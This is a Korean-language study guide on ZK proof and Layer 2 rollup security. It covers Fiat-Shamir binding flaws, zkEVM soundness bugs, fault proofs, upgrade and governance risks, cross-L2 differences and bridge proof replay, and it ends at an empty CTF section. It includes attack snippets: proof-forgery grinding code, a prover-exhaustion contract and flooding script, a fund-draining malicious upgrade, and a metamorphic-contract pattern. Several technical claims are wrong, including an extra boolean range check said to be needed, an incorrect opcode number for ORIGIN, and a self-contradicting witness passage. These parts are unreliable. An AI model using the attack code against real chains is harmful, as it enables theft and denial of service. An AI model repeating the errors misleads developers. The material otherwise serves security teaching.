# Phase 8: ZK/L2 보안

> **학습 목표**: ZK 증명 시스템의 수학적 취약점과 Layer 2 롤업의 보안 모델을 이해하고, 실제 공격 벡터와 방어 기법을 습득한다.

---

## 목차

1. [zkVM Soundness 취약점](#1-zkvm-soundness-취약점)
2. [ZK Rollup 보안](#2-zk-rollup-보안)
3. [Optimistic Rollup 보안](#3-optimistic-rollup-보안)
4. [L2 거버넌스 & 업그레이드](#4-l2-거버넌스--업그레이드)
5. [크로스 L2 보안](#5-크로스-l2-보안)
6. [ZK 브릿지 보안](#6-zk-브릿지-보안)
7. [CTF 문제 유형](#7-ctf-문제-유형)

---

## 1. zkVM Soundness 취약점

### 1.1 배경: OSecure 2026.03 분석

2026년 3월 OSecure 연구팀은 6개의 주요 zkVM 구현체에서 동일한 근본 원인을 공유하는 soundness 취약점 패턴을 발표했다. 대상 프로젝트:

- **Jolt** (a16z Research)
- **Nexus zkVM**
- **Cairo-M** (StarkWare의 새 VM)
- **Ceno** (Scroll 기여)
- **Expander**
- **Binius64**

이 취약점들은 모두 "Fiat-Shamir 트랜스크립트 바인딩 누락"이라는 동일한 근본 원인에서 파생되었다.

### 1.2 ZK 증명 시스템 기초

**Interactive Proof Protocol:**
```
증명자(Prover) P ↔ 검증자(Verifier) V

P가 "나는 x의 비밀 w를 알고 있다" 증명

라운드 1: V → P: 랜덤 챌린지 r₁
라운드 2: P → V: 응답 a₁ = f(w, r₁)
라운드 3: V → P: 랜덤 챌린지 r₂
라운드 4: P → V: 응답 a₂ = g(w, r₁, r₂)
...
V: 모든 응답이 일관성 있는지 검증
```

**Fiat-Shamir 변환 (Interactive → Non-Interactive):**
```
Interactive를 Non-Interactive로 변환하는 핵심 기법

변환 원리:
  랜덤 챌린지 r₁, r₂, ... 을
  이전 메시지들의 해시로 대체

  r₁ = H(context, commitment₁)
  r₂ = H(context, commitment₁, a₁, commitment₂)
  ...

여기서 context = (protocol_id, circuit_id, public_inputs, ...)
```

**핵심 보안 조건:**
```
챌린지가 진짜 랜덤처럼 동작하려면:
  반드시 모든 이전 메시지가 해시에 포함되어야 함
  특히 "public inputs"와 "circuit 식별자"가 포함되어야 함

만약 누락되면:
  증명자가 챌린지를 "선택"할 수 있음 (Grinding Attack)
```

### 1.3 Fiat-Shamir 트랜스크립트 바인딩 누락

**취약한 구현 패턴:**

```rust
// 취약한 코드 (Jolt 유사 패턴)
fn compute_challenge(
    commitment: &Commitment,
    // 주목: public_inputs가 없음!
) -> Fr {
    let mut transcript = Transcript::new();
    transcript.append_message(b"commitment", &commitment.to_bytes());
    // public_inputs를 transcript에 바인딩하지 않음!
    transcript.challenge_scalar(b"challenge")
}

// 올바른 코드
fn compute_challenge(
    commitment: &Commitment,
    public_inputs: &[Fr],  // 반드시 포함
    circuit_id: &[u8],     // 반드시 포함
) -> Fr {
    let mut transcript = Transcript::new();
    transcript.append_message(b"circuit_id", circuit_id);
    transcript.append_message(b"public_inputs", &serialize(public_inputs));
    transcript.append_message(b"commitment", &commitment.to_bytes());
    transcript.challenge_scalar(b"challenge")
}
```

**공격 메커니즘:**

```
취약 시나리오:
  circuit: x² = y (x가 비밀, y가 공개)

  정상 증명: x=3, y=9 → 증명 π₉

  공격자 목표: x를 모르고 y=100에 대한 증명 생성

  만약 챌린지 α가 public_inputs를 바인딩하지 않으면:

  공격자가 할 수 있는 것:
    1. 여러 랜덤 값으로 commitment C' 시도
    2. 각 C'에 대해 α' = H(C') 계산
    3. 검증 방정식: α'·V + β = target 에서 V 역산
       → V = (target - β) / α'
    4. y=100에 대한 검증을 통과하는 (C', V) 쌍 발견!
```

**수학적 상세:**

Sumcheck 기반 증명 (많은 zkVM이 사용):
```
증명자가 다항식 f(x₁, ..., xₙ)의 합산을 증명
  ∑_{x ∈ {0,1}^n} f(x₁, ..., xₙ) = C

라운드 k에서:
  - 증명자: gₖ(t) = ∑_{xₖ₊₁,...,xₙ ∈ {0,1}} f(r₁,...,rₖ₋₁, t, xₖ₊₁,...,xₙ)
  - 검증자: rₖ = H(transcript_k) 생성

취약점: transcript_k에 C(공개 입력)가 없으면
  공격자가 C를 사후에 선택 가능!
```

**검증 방정식 선형성 공격:**

```python
# 단순화된 예시
# 검증 방정식: α * V = target - β
# α = H(commitment)  (public_inputs 바인딩 없음)
# target은 공개 입력에 의존

def forge_proof(target_public_input):
    """
    취약한 Fiat-Shamir를 악용한 위조 증명
    """
    # 무작위 commitment 시도
    for _ in range(2**20):  # grinding
        fake_commitment = random_field_element()
        alpha = H(fake_commitment)  # public_input 미포함
        beta = compute_beta(fake_commitment)

        # 공격자가 원하는 target으로 V 역산
        target = compute_target(target_public_input)
        V = (target - beta) * modular_inverse(alpha)

        # V가 유효한 범위 내에 있으면 성공
        if is_valid_witness_range(V):
            return (fake_commitment, V)

    return None  # grinding 실패
```

### 1.4 "When in doubt, absorb it" 원칙

OSecure 보고서가 제안한 방어 원칙:

```
원칙: 트랜스크립트에 포함시켜야 할지 불확실하다면, 포함시켜라.

구체적 체크리스트:
  ✓ 모든 public inputs (회로의 공개 입력값)
  ✓ Circuit identifier / version
  ✓ Protocol parameters (field size, curve type 등)
  ✓ 모든 commitments (생성 순서대로)
  ✓ Verifier key (만약 다를 수 있다면)
  ✓ Domain separation labels (각 단계마다)

포함시키면 안 되는 것:
  ✗ 비밀 witness 값 (zero-knowledge 훼손)
  ✗ 검증자가 모르는 정보
```

**올바른 트랜스크립트 구조:**

```rust
fn create_proof_transcript(
    circuit_id: &[u8; 32],
    verifier_key: &VerifierKey,
    public_inputs: &[Fr],
    witness: &Witness,
) -> ProofTranscript {
    let mut transcript = Transcript::new(b"zkVM-proof-v1");

    // 1. 도메인 분리 (필수)
    transcript.append_message(b"circuit-id", circuit_id);

    // 2. 검증자 키 바인딩 (선택적이지만 권장)
    transcript.append_message(b"vk", &verifier_key.to_bytes());

    // 3. 공개 입력값 바인딩 (필수!)
    for (i, input) in public_inputs.iter().enumerate() {
        transcript.append_message(
            format!("public-input-{}", i).as_bytes(),
            &input.to_bytes()
        );
    }

    // 이후 commitment들은 witness로부터 생성
    // 각 commitment 생성 후 즉시 transcript에 추가
    transcript
}
```

### 1.5 Binius64 특수 취약점: Binary Field 체계

```
Binius64의 특성:
  - GF(2^64) 위에서 동작하는 다항식
  - 2의 거듭제곱 특성으로 특수한 취약점 가능

취약점: 특정 챌린지 값에서 역원이 존재하지 않음
  α = 0 이면 α * V = target에서 target ≠ 0이면 해 없음
  하지만 target = 0이면 임의의 V 가능

  공격: 트랜스크립트 조작으로 α = 0 유도
  (public inputs 미포함 시 가능)
```

---

## 2. ZK Rollup 보안

### 2.1 zkEVM 분류 (Vitalik의 Type 1-4)

```
Type 1 (완전 동일): Ethereum과 100% 동일
  - 예시: taiko
  - 특성: 기존 EVM 증명자 사용 가능, 매우 느린 증명 생성
  - 보안: EVM과 동일한 특성
  - 취약점: 증명 생성 시간으로 인한 지연

Type 2 (EVM 동일): 내부 구조 일부 변경 가능하나 외부 동작 동일
  - 예시: Scroll, Polygon zkEVM (모드에 따라)
  - 특성: 대부분의 EVM 도구 그대로 사용
  - 취약점: 내부 상태 표현 차이로 엣지 케이스 존재

Type 3 (거의 EVM): 일부 EVM 기능 미지원
  - 예시: Polygon zkEVM (일부 모드)
  - 특성: 일부 precompile 미지원, 일부 opcode 동작 다름
  - 취약점: 호환성 버그

Type 4 (High-level 언어 동일):
  - 예시: zkSync Era (Yul 수준 컴파일)
  - 특성: EVM bytecode 직접 실행 아닌 자체 IR로 컴파일
  - 취약점: 컴파일러 버그, 동작 차이
```

### 2.2 Soundness 버그 (Primary Failure Mode)

ZK 롤업의 핵심 보안 목표는 "soundness": 거짓 증명을 검증자가 수락하지 않아야 함.

**Soundness 버그 카테고리:**

**카테고리 1: 미증명 제약 조건**
```
회로 설계 오류: 특정 연산의 제약 조건이 불완전

예시: 범위 체크 누락
  정상: 0 ≤ x < 2^256 확인
  취약: 범위 체크 없음
  결과: x = -1 (모듈러 아리스메틱 악용) 가능

Solidity 예시 (ZK 외에도 유사):
  // 취약: uint8 overflow
  function vulnerable(uint8 a, uint8 b) returns (uint8) {
      return a + b;  // 255 + 1 = 0 (overflow)
  }

ZK 회로에서:
  // 취약: 값이 0 또는 1임을 보장하지 않음
  constraint: x * (x - 1) = 0  // 이것만으로 충분
  // 하지만 field element이므로:
  // field size가 p이면 x = p 도 조건 만족!
  // (p * (p-1) ≡ 0 * (-1) ≡ 0 mod p)

  // 올바른 구현:
  constraint: x * (x - 1) = 0
  constraint: x < 2  // 또는 boolean_check(x)
```

**카테고리 2: 불완전한 opcode 구현**
```
zkEVM에서 EVM opcode를 회로로 구현할 때 발생

실제 사례 (Scroll, 2023년 감사 발견):
  RETURNDATACOPY opcode의 범위 체크 누락
  → 메모리 범위 밖의 데이터 접근 가능
  → 검증자가 잘못된 실행 결과를 수락

SHA3(keccak256) 구현:
  keccak 내부 상태 24개 라운드 모두 올바르게 구현해야 함
  하나라도 잘못되면 soundness 위반
```

**카테고리 3: 증인 유일성 위반**
```
같은 공개 입력에 대해 여러 유효한 증인이 존재할 수 있어야 함
(영지식성 요구사항)

하지만 soundness 관점에서는:
  거짓 실행 결과에 대한 증인이 존재하면 안 됨

엣지 케이스:
  // EVM의 ECRECOVER precompile
  // 잘못된 서명에 대해 주소 0 반환
  // zkEVM이 이를 올바르게 처리하지 않으면
  // 공격자가 임의 주소를 ECRECOVER 결과로 주장 가능
```

### 2.3 Prover Killer (DA 포화 공격)

**개념:**
```
ZK 증명 생성은 계산 집약적 작업
→ 특정 연산은 다른 것보다 훨씬 많은 증명 비용 발생

공격: 증명 비용이 높은 트랜잭션 집중 제출
      Prover의 계산 자원 소진
      → 블록 생성 지연 또는 중단
```

**고비용 연산 예시:**

```
EVM 관점에서 ZK 비용:
  SHA3: 일반 연산의 ~100-1000배 ZK 비용
  KECCAK: 특히 비쌈 (Merkle 트리 검증에 많이 사용)
  ECRECOVER: 타원 곡선 연산, 매우 비쌈
  modexp: 큰 지수의 모듈러 제곱, 증명 불가 수준

공격 예시:
  contract ProverKiller {
      function attack() external {
          for (uint i = 0; i < 100; i++) {
              // 매 반복마다 keccak 해시
              bytes32 h = keccak256(abi.encode(i, block.timestamp));
              // 결과 사용 (최적화 제거 방지)
              assembly { mstore(0, h) }
          }
      }
  }
```

**방어 메커니즘:**
```
1. ZK 가스 미터링:
   EVM 가스와 별도로 ZK 비용 측정
   높은 ZK 비용 연산에 추가 요금 부과

2. Prover 병렬화:
   여러 Prover가 동시에 다른 트랜잭션 증명
   단일 고비용 트랜잭션이 전체 막지 않도록

3. 회로 최적화:
   KECCAK을 Poseidon으로 교체 (ZK 친화적)
   하지만 EVM 호환성 감소

4. 트랜잭션 필터링:
   극단적 ZK 비용 트랜잭션 제외 (검열 우려)
```

### 2.4 zkEVM 상세 구현 취약점

**메모리 모델 불일치:**
```
EVM 메모리: 바이트 단위, 256비트 워드 정렬
zkEVM 회로: 보통 필드 원소 단위

불일치 예시:
  MSTORE8 (1바이트 저장)
  → 회로에서 256비트 슬롯의 특정 바이트만 업데이트
  → 나머지 255바이트 유지 로직이 복잡
  → 버그 가능성 높음

실제 버그 (가상):
  MSTORE8이 실제로 2바이트를 덮어쓰는 회로 버그
  → 공격자가 이를 이용해 인접 메모리 조작
  → 임의 코드 실행 아니지만 예상치 못한 연산 결과
```

---

## 3. Optimistic Rollup 보안

### 3.1 Optimistic Rollup 기본 모델

```
핵심 가정: 모든 트랜잭션은 유효하다고 가정 (낙관적)
           누군가 이의를 제기할 경우에만 검증

구성 요소:
  Sequencer: 트랜잭션 수집, 순서화, L1에 데이터 게시
  State Root: 각 배치 후 상태 루트를 L1에 기록
  Fraud Prover: 상태 전환 오류 감지 및 증명
  Challenge Period: 이의 제기 가능 기간 (보통 7일)
```

**상태 전환 과정:**
```
L1 컨트랙트 (Optimism 기준):
  1. Sequencer가 L2 배치를 L1에 calldata로 게시
  2. State Root를 L1 OutputOracle 컨트랙트에 기록
  3. 7일 challenge window 시작
  4. 이의 없으면 → Finalized (출금 가능)
  5. 이의 있으면 → Fault Proof 게임 시작
```

### 3.2 Challenger 검열 공격

**공격 시나리오:**
```
공격자(=Sequencer 운영자 또는 협력자):
  1. 유효하지 않은 상태 루트를 L1에 게시
  2. Challenger들이 이의 제기 트랜잭션 제출 시도
  3. 공격자가 Challenger 트랜잭션을 검열 (L1에서 제외)
  4. Challenge window 만료
  5. 잘못된 상태가 Finalized
  6. 공격자가 L2에서 L1으로 가짜 출금

현실적 어려움:
  - L1 검열은 어렵지만 불가능하지 않음
  - OFAC 같은 강제 검열 가능
  - 일시적 L1 네트워크 혼잡 이용
```

**Optimism의 Permissioned Fault Proof (2024):**
```
초기 해결책:
  선택된 소수의 Challenger만 이의 제기 가능
  → 완전 분산화되지 않지만 신뢰할 수 있는 집합
  → 검열 공격을 분산화로 대응

Permissionless Fault Proof (목표):
  누구나 Challenger가 될 수 있음
  → 검열하려면 모든 이더리움 사용자 검열 필요
  → 현실적으로 불가
```

### 3.3 Fault Proof 메커니즘 상세

**단일 라운드 Fraud Proof (단순 모델):**
```solidity
// 단순화된 Fraud Proof
contract SimpleOptimisticRollup {
    struct Batch {
        bytes32 stateRoot;
        bytes32 txHash;
        uint256 timestamp;
        bool challenged;
        bool finalized;
    }

    function submitBatch(
        bytes32 stateRoot,
        bytes calldata txData
    ) external onlySequencer {
        batches.push(Batch({
            stateRoot: stateRoot,
            txHash: keccak256(txData),
            timestamp: block.timestamp,
            challenged: false,
            finalized: false
        }));
    }

    function challenge(
        uint256 batchId,
        bytes calldata correctExecution
    ) external {
        Batch storage batch = batches[batchId];
        require(block.timestamp < batch.timestamp + CHALLENGE_PERIOD);

        // 올바른 실행 결과 계산
        bytes32 correctRoot = computeStateRoot(correctExecution);

        if (correctRoot != batch.stateRoot) {
            // 사기 증명 성공
            batch.stateRoot = correctRoot;
            slashSequencer();
        }
    }
}
```

**Bisection Protocol (실제 구현):**
```
문제: 전체 배치를 온체인에서 재실행하면 너무 비쌈

해결: 이분 탐색으로 불일치 지점 찾기

과정:
  1. Sequencer S, Challenger C가 상태 전환 동의 여부 확인
  2. 배치를 절반으로 나눔: 전반부/후반부
  3. 어느 절반에서 불일치? 해당 절반 다시 분할
  4. 반복 → 단 하나의 명령어 불일치 지점 발견
  5. 해당 명령어 하나만 온체인 실행 → 판정

Optimism Cannon:
  - MIPS 명령어 수준으로 분해
  - 단일 MIPS 명령어를 EVM에서 실행하여 판정
  - Arbitrum은 WASM 기반 비슷한 방식
```

### 3.4 강제 포함 메커니즘 (Force Inclusion)

**문제: Sequencer의 검열**
```
Sequencer가 특정 트랜잭션을 L2에서 제외할 수 있음
→ 사용자가 L2에서 활동 불가
```

**해결: Forced Transaction (Optimism):**
```solidity
// L1에서 직접 L2 트랜잭션 강제 삽입
contract OptimismPortal {
    function depositTransaction(
        address _to,
        uint256 _value,
        uint64 _gasLimit,
        bool _isCreation,
        bytes memory _data
    ) external payable {
        // L1에 이벤트 기록
        emit TransactionDeposited(
            msg.sender,
            _to,
            DEPOSIT_VERSION,
            opaqueData
        );
        // Sequencer는 이 트랜잭션을 반드시 포함해야 함
        // 미포함 시 Sequencer가 제출한 상태는 무효
    }
}
```

**한계:**
```
강제 포함의 지연:
  - 기본적으로 Sequencer가 자신의 큐를 먼저 처리
  - 강제 포함 트랜잭션은 12-24시간 지연 가능
  - 그동안 L2 자산은 잠길 수 있음

개선 중인 방향:
  - 강제 포함 지연 시간 단축
  - 즉각적 강제 포함 (Sequencer 우회 완전 불가)
```

### 3.5 Sequencer 중앙화 위험

```
현재 상황 (2024-2025):
  Optimism: 단일 Sequencer (OP Labs 운영)
  Arbitrum: 단일 Sequencer (Offchain Labs 운영)
  Base: 단일 Sequencer (Coinbase 운영)

위험:
  1. 단일 실패점: Sequencer 다운 → 전체 L2 중단
  2. 검열 위험: Sequencer가 특정 거래 거부 가능
  3. MEV 독점: 순서 결정권 독점

실제 사례:
  2024년 Arbitrum Sequencer 30분 중단
  → L2 완전 중단, 트랜잭션 처리 불가
  → Force Inclusion으로도 즉각 해결 안됨

분산화 계획:
  OP Stack Sequencer 분산화 (Superchain)
  Espresso Systems Sequencer 공유
  하지만 2025년 현재 대부분 여전히 중앙화
```

---

## 4. L2 거버넌스 & 업그레이드

### 4.1 업그레이드 권한 위험

**L2 컨트랙트 업그레이드 구조:**
```
Proxy Pattern:
  ProxyAdmin ──upgradeTo()──> Proxy ──delegatecall──> Implementation

ProxyAdmin 소유자:
  - Optimism: 2/2 multisig (초기) → Security Council
  - Arbitrum: DAO 거버넌스 + Security Council
  - zkSync: 8/12 multisig

위험:
  ProxyAdmin private key 탈취
  → 악의적 구현체로 업그레이드
  → 모든 브릿지 자금 탈취 가능!
```

**실제 공격 시나리오:**
```
공격자가 multisig 서명자 과반수 키 탈취:

1. 악의적 구현체 배포:
   contract MaliciousImpl {
       function withdraw(address to, uint amount) external {
           // 원래 로직 없음
           token.transfer(to, amount);  // 모든 자금 탈취
       }
   }

2. 업그레이드 실행:
   proxyAdmin.upgradeTo(address(maliciousImpl));

3. 탈취:
   maliciousImpl.withdraw(attacker, type(uint256).max);

위험 금액: 수십억 달러 (대형 L2의 브릿지 TVL)
```

### 4.2 Security Council Tradeoff

```
Security Council의 역할:
  - 긴급 업그레이드 (취약점 발견 시)
  - 거버넌스 제안 거부권
  - 악의적 업그레이드 방지

딜레마:
  강한 Security Council:
    + 빠른 긴급 대응 가능
    - 소수에게 권한 집중
    - 탈중앙화 훼손

  약한 Security Council:
    + 더 탈중앙화
    - 취약점 발견 시 즉각 대응 불가
    - 타임록(timelock) 동안 공격 지속

현실적 접근 (Optimism):
  - 12/12 Security Council (긴급 업그레이드: 빠른 실행 가능)
  - OP Governance: 일반 업그레이드 (3.5일 타임록)
  - Guardian: 추가 거부권

Arbitrum:
  - 9/12 Security Council
  - DAO: 정상 업그레이드 (최소 3일)
  - Emergency upgrade: Security Council만으로 즉시 실행
```

### 4.3 Timelock 우회 위험

```
타임록 목적:
  업그레이드 제안 → N일 대기 → 실행
  → 사용자가 이상한 업그레이드 발견 시 자금 이동 가능

우회 시나리오:
  1. Social Engineering: Security Council 멤버 압박
  2. Flash Loan + Governance: 거버넌스 토큰 대량 차입
     → 타임록 단축 제안 통과
     → 즉각 실행 가능하게 변경
     → 악의적 업그레이드

3. Multisig Key Compromise:
   → Emergency path 활성화
   → 타임록 없이 업그레이드

방어:
  - 타임록 최소값 하드코딩 (변경 불가)
  - 다층 거버넌스 (DAO + Security Council + Guardian)
  - 긴급 업그레이드도 최소 지연
```

### 4.4 EIP-6780 미적용 L2에서 Metamorphic 컨트랙트

**배경:**
```
EIP-6780 (Dencun, 2024년 3월):
  SELFDESTRUCT를 제한 (같은 트랜잭션 내 생성된 경우만 소멸 가능)
  이후 배포된 컨트랙트는 SELFDESTRUCT로 소멸 불가

Metamorphic 공격:
  SELFDESTRUCT + CREATE2를 이용해 동일 주소에 다른 코드 배포
```

**공격 메커니즘:**
```solidity
// EIP-6780 이전 (또는 미적용 L2)에서 가능
contract MetamorphicFactory {
    function deploy(bytes memory initCode) external returns (address) {
        address target;
        assembly {
            target := create2(0, add(initCode, 32), mload(initCode), 0)
        }
        return target;
    }
}

contract ChangeableContract {
    address public owner;

    // 버전 1: 정상 동작
    function version1Logic() external { ... }

    function selfDestructMe() external {
        selfdestruct(payable(msg.sender));
    }
}

// 공격 흐름:
// 1. ChangeableContract 배포 (감사 통과, 신뢰 획득)
// 2. ChangeableContract.selfDestructMe() 호출 (소멸)
// 3. 동일 salt로 악의적 코드 재배포 (같은 주소!)
// 4. 사용자는 주소 신뢰 → 악성 코드 실행
```

**L2별 EIP-6780 적용 현황:**
```
Optimism (Bedrock): EIP-6780 적용 (2024년 이후)
Arbitrum Stylus: 적용
zkSync Era: 부분 적용 (확인 필요)
일부 구형 L2: 미적용 → 취약

확인 방법:
  L2의 EVM 버전 확인
  "Cancun" 또는 "Prague" EVM이면 안전
  "Shanghai" 이하면 확인 필요
```

---

## 5. 크로스 L2 보안

### 5.1 EVM Opcode 비호환성

**체인별 특수 opcode:**

```
Optimism 특수 opcode:
  ORIGIN (tx.origin): L1에서 강제 포함된 경우 다를 수 있음
  CALLER: deposit 트랜잭션에서 L1 컨트랙트 주소

  새 opcode:
  0x44 (ORIGIN): 기존과 동일
  L1BLOCKHASH: L1 블록 해시 접근 가능
```

```
Arbitrum 특수 opcode:
  ArbOS 추가 precompile:
    0x0000...0064 (ArbSys): 시스템 콜
    0x0000...0065 (ArbRetryableTx): 재시도 가능 tx
    0x0000...006B (ArbGasInfo): 가스 정보

  비호환 동작:
    BLOCKHASH: L2 블록 해시 (L1 아님)
    BLOCK.NUMBER: L2 블록 번호
    BLOCK.TIMESTAMP: L2 타임스탬프 (L1과 다름!)
```

**취약한 코드 패턴:**
```solidity
// 취약: L1과 L2에서 다르게 동작
contract TimeLock {
    uint256 public unlockTime;

    function lock(uint256 duration) external payable {
        unlockTime = block.timestamp + duration;
    }

    function unlock() external {
        require(block.timestamp >= unlockTime);
        // ...
    }
}
// L2의 block.timestamp는 Sequencer가 조작 가능할 수 있음
// (특히 구형 L2 구현에서)
```

### 5.2 Precompile 구현 차이

**ECRECOVER 차이:**
```
L1 Ethereum:
  - 잘못된 서명에 대해 address(0) 반환 (revert 안 함)
  - 특정 엣지 케이스 처리

zkSync Era (초기):
  - 일부 엣지 케이스에서 L1과 다른 결과
  - 서명 검증 로직 버그

취약한 코드:
  address signer = ecrecover(hash, v, r, s);
  require(signer == expectedSigner, "invalid sig");
  // 만약 zkSync에서 ecrecover가 다르게 동작하면
  // 악의적 서명이 통과될 수 있음
```

**Modexp (EIP-198) 차이:**
```
Modexp 형식: base^exp mod modulus

L1: Gas = (adjusted_exp_length * mult_complexity) / GQUADDIVISOR
L2: 일부 구현에서 가스 계산 다름
   또는 오버플로우 처리 다름

RSA 서명 검증 컨트랙트:
  L1에서는 올바르게 동작
  일부 L2에서 modexp 결과 다름
  → 서명 검증 로직 우회 가능
```

### 5.3 체인 ID 혼동 공격

```
EIP-155 체인 ID:
  서명에 chain_id 포함 → 리플레이 방지

L2의 체인 ID:
  Optimism: 10
  Arbitrum One: 42161
  Base: 8453
  zkSync Era: 324

리플레이 공격 시나리오:
  1. L2A에서 트랜잭션 서명
  2. 같은 체인 ID를 가진 테스트넷에서 리플레이
  3. 또는 체인 ID 미포함 구현에서

방어:
  - 항상 EIP-155 사용 (체인 ID 포함)
  - 컨트랙트에서 block.chainid 확인

  mapping(bytes32 => bool) executed;

  function execute(bytes memory sig, ...) {
      bytes32 hash = keccak256(abi.encode(
          block.chainid,  // 필수!
          address(this),
          nonce,
          ...
      ));
      require(!executed[hash], "already executed");
      executed[hash] = true;
      // ...
  }
```

---

## 6. ZK 브릿지 보안

### 6.1 ZK 브릿지 아키텍처

```
기본 구조:
  L2 → ZK 증명 생성 → L1 검증자 → L1에서 자금 출금

구성 요소:
  1. L2 상태 커밋: Sequencer가 L1에 상태 루트 게시
  2. ZK 증명: L2 상태 전환의 유효성 증명
  3. L1 Verifier: 온체인 ZK 증명 검증
  4. Bridge Contract: 자금 락/언락
```

### 6.2 증명 재사용 (Proof Replay) 공격

**공격 시나리오:**
```
취약한 브릿지:
  1. L2에서 1000 ETH 출금 트랜잭션
  2. ZK 증명 π₁ 생성
  3. L1에서 π₁ 검증 → 1000 ETH 수령

재사용 공격:
  4. 공격자가 동일한 π₁을 다시 제출
  5. 취약한 브릿지가 π₁을 다시 검증
  6. 추가 1000 ETH 수령!

근본 원인:
  - nullifier(사용된 증명 추적) 미구현
  - 증명이 상태 전환에 바인딩되지 않음
```

**방어 코드:**
```solidity
contract SecureBridge {
    // 사용된 출금 nullifier 추적
    mapping(bytes32 => bool) public nullifiers;

    function withdraw(
        bytes calldata proof,
        bytes32 withdrawalRoot,  // 해당 L2 상태 루트
        uint256 amount,
        address recipient,
        bytes32 nullifier  // 이 출금의 고유 식별자
    ) external {
        // nullifier 중복 사용 방지
        require(!nullifiers[nullifier], "already withdrawn");

        // 증명 검증
        require(
            verifier.verify(proof, withdrawalRoot, amount, recipient, nullifier),
            "invalid proof"
        );

        // L1에 기록된 상태 루트와 일치 확인
        require(validStateRoots[withdrawalRoot], "unknown state root");

        // nullifier 소각
        nullifiers[nullifier] = true;

        // 자금 전송
        payable(recipient).transfer(amount);
    }
}
```

### 6.3 Verifier 컨트랙트 취약점

**잘못된 pairing 체크:**
```solidity
// 취약한 Groth16 검증
function verifyProof(
    uint[2] memory a,
    uint[2][2] memory b,
    uint[2] memory c,
    uint[] memory input
) public view returns (bool) {
    // pairing 연산
    // 취약: negation이 올바르지 않을 때
    return Pairing.pairingProd4(
        Pairing.negate(proof.a),  // ← 이 negation이 올바른가?
        proof.b,
        vk.alfa1,
        vk.beta2,
        vk_x,
        vk.gamma2,
        proof.c,
        vk.delta2
    );
}

// 올바른 negation 확인 필요:
// G1 점의 negation: (x, p - y) where p is field prime
// 일부 구현에서 y 대신 -y를 (p-y)와 혼동
```

**Trusted Setup 취약점 (Groth16):**
```
Groth16은 circuit별 trusted setup이 필요

Powers of Tau 참여자들이 "독성 폐기물" (toxic waste) 생성
이 값을 아는 사람은 거짓 증명 생성 가능

위험:
  - Setup 참여자 중 하나라도 독성 폐기물 보관 시
  - 언제든 무한한 위조 증명 생성 가능
  - 브릿지 자금 전액 탈취

실제 방어:
  - MPC ceremony로 최대한 많은 참여자
  - "1-of-N" 신뢰 가정: N명 중 1명만 정직하면 안전
  - PLONK/STARKs (trusted setup 불필요) 선호 추세
```

---

## 7. CTF 문제 유형

### 7.1 Fiat-Shamir 바인딩 누락

**CTF 문제 패턴:**
```
주어진 것:
  - ZK 증명 검증 컨트랙트
  - 특정 공개 입력값 x에 대한 증명 생성 함수
  - 목표: 다른 공개 입력값 y에 대한 유효한 증명 생성

풀이 접근:
  1. 챌린지 생성 함수 분석
  2. 공개 입력값이 챌린지에 바인딩되는지 확인
  3. 바인딩 없으면: 유효한 증명에서 챌린지 추출
  4. 해당 챌린지로 y에 대한 위조 증명 구성
```

**실습 코드 (단순화된 Sumcheck):**
```python
from hashlib import sha256
from typing import List

def vulnerable_fiat_shamir(commitment: bytes) -> bytes:
    """
    취약: public_input이 챌린지에 바인딩되지 않음
    """
    h = sha256()
    h.update(b"challenge")
    h.update(commitment)
    # public_input 없음!
    return h.digest()

def secure_fiat_shamir(commitment: bytes, public_input: bytes) -> bytes:
    """
    안전: public_input 포함
    """
    h = sha256()
    h.update(b"challenge-v1")
    h.update(public_input)  # 필수!
    h.update(commitment)
    return h.digest()

def attack_vulnerable_fs():
    """
    취약한 구현 공격:
    original proof: statement x=3, y=9
    forge proof for: statement x=4, y=16
    """
    # 기존 증명에서 commitment 추출
    original_commitment = b"commitment_for_x3_y9"

    # 챌린지는 commitment만으로 결정됨
    challenge = vulnerable_fiat_shamir(original_commitment)

    # 동일 commitment + 동일 challenge로 다른 statement 위조
    # (실제로는 선형 방정식 풀이 필요)
    forged_response = forge_response(challenge, target_y=16)

    return (original_commitment, challenge, forged_response)
```

### 7.2 DA Prover Killer CTF

**문제 설정:**
```
목표: ZK Rollup의 증명 생성을 지연시켜
     특정 시간 내에 블록을 생성하지 못하게 하기

테스트넷 설정:
  - 로컬 zkEVM 노드
  - 제한된 Prover 자원 (CPU 2코어, 10분 시간제한)
  - 목표: Prover가 제한 시간 내에 증명 생성 실패하게 만들기
```

**풀이:**
```python
from web3 import Web3

# 연결
w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# Prover Killer 컨트랙트
PROVER_KILLER_ABI = [...]
PROVER_KILLER_ADDR = "0x..."
contract = w3.eth.contract(address=PROVER_KILLER_ADDR, abi=PROVER_KILLER_ABI)

def prover_killer_attack():
    """
    keccak256을 대량 호출하여 ZK 증명 비용 극대화
    """
    # 단일 트랜잭션에 최대 가스 사용
    gas_limit = 10_000_000

    # 각 트랜잭션에서 가능한 많은 keccak 호출
    tx = contract.functions.massKeccak(
        iterations=1000  # keccak을 1000번 반복
    ).build_transaction({
        'gas': gas_limit,
        'gasPrice': w3.eth.gas_price,
    })

    # 여러 트랜잭션 동시 제출 (네트워크 과부하)
    txs = []
    for i in range(10):
        signed = w3.eth.account.sign_transaction(tx, private_key)
        txs.append(w3.eth.send_raw_transaction(signed.rawTransaction))

    return txs

# 실행 및 모니터링
txs = prover_killer_attack()
for tx_hash in txs:
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Gas used: {receipt['gasUsed']}")
```

### 7.3 Rollup 탈출 (Forced Exit) CTF

**문제:** Sequencer가 당신의 트랜잭션을 검열하고 있다. L2 자금을 L1으로 가져와라.

```solidity
// Force Withdrawal 구현
interface IOptimismPortal {
    function depositTransaction(
        address _to,
        uint256 _value,
        uint64 _gasLimit,
        bool _isCreation,
        bytes memory _data
    ) external payable;
}

contract ForcedEscape {
    IOptimismPortal constant portal = IOptimismPortal(
        0xbEb5Fc579115071764c7423A4f12eDde41f106Ed
    );

    function forceWithdraw(
        address l2Token,
        uint256 amount,
        address l1Recipient
    ) external {
        // L2 토큰 브릿지에 출금 요청을 L1 deposit으로 강제 삽입
        bytes memory withdrawData = abi.encodeWithSignature(
            "withdrawTo(address,uint256,uint32,bytes)",
            l2Token,
            amount,
            200000,  // gas limit
            ""
        );

        portal.depositTransaction{value: 0}(
            L2_BRIDGE_ADDRESS,  // L2 브릿지에게 전달
            0,
            200000,
            false,
            withdrawData
        );
        // 이 트랜잭션은 Sequencer가 무시할 수 없음
        // L1 이벤트이므로 반드시 포함해야 함
    }
}
```

### 7.4 브릿지 증명 재사용 CTF

